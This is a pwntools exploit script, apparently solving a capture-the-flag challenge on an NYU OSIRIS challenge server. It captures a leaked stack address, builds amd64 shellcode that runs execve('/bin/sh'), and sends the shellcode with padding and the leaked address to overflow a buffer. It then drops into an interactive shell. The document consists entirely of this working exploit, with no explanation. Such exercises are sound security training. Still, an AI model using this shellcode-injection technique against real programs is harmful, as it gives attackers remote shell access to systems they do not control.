from pwn import *

context.arch = 'amd64'
context.os = 'linux'

server = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1290)
server.recvuntil(b': ')
server.sendline(b'<NET ID>')

# Capture leaked address
server.recvuntil(b'at: ')
leaked_address = int(server.recvline().strip(), 16)

# Construct shell-spawning shellcode
shellcode = asm('''
    xor rax, rax              # Zero rax
    mov rdi, 0x68732f6e69622f # Load /bin/sh string
    push rdi                  # Push to stack
    mov rdi, rsp              # Set rdi to /bin/sh
    xor rsi, rsi              # Zero rsi
    xor rdx, rdx              # Zero rdx
    mov rax, 0x3b             # execve syscall number
    syscall                   # Trigger syscall
''')

padding = b'A' * 24   # Overflow buffer with padding
payload = shellcode + padding + p64(leaked_address)
server.sendline(payload)
server.interactive()
